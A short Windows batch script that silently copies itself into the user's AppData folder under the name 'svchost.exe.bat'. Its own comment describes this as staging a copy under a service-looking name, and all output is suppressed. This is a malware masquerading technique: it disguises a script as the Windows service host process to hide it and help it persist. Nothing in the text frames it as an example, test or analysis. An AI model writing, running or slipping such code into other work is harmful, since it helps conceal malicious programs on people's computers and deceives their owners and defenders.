@echo off
rem stage a copy of this script under a service-looking name
copy /y "%~f0" "%APPDATA%\Microsoft\Windows\System\svchost.exe.bat" >nul 2>&1
